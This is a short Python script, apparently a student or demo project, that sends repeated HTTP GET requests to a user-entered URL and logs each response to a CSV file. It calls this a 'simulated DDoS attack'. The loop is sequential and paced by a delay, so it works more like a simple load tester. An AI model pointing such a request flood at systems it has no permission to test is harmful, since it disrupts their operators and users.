import requests
import time
import csv
from threading import Thread

LOG_FILE = "logs/attack_logs.csv"

def simulate_ddos(url, packets, delay):
    print(f"Starting simulated DDoS attack on {url}...\n")
    with open(LOG_FILE, mode="w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["Packet Number", "Status", "Response Code", "Timestamp"])
        for i in range(1, packets + 1):
            try:
                response = requests.get(url)
                status = "Success" if response.status_code < 400 else "Failure"
                print(f"Packet {i}: {status} ({response.status_code})")
                writer.writerow([i, status, response.status_code, time.time()])
            except Exception as e:
                print(f"Packet {i}: Failure (Error: {e})")
                writer.writerow([i, "Failure", "Error", time.time()])
            time.sleep(delay)

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    num_packets = int(input("Enter the number of packets: "))
    delay_between = float(input("Enter delay between packets (seconds): "))
    simulate_ddos(target_url, num_packets, delay_between)
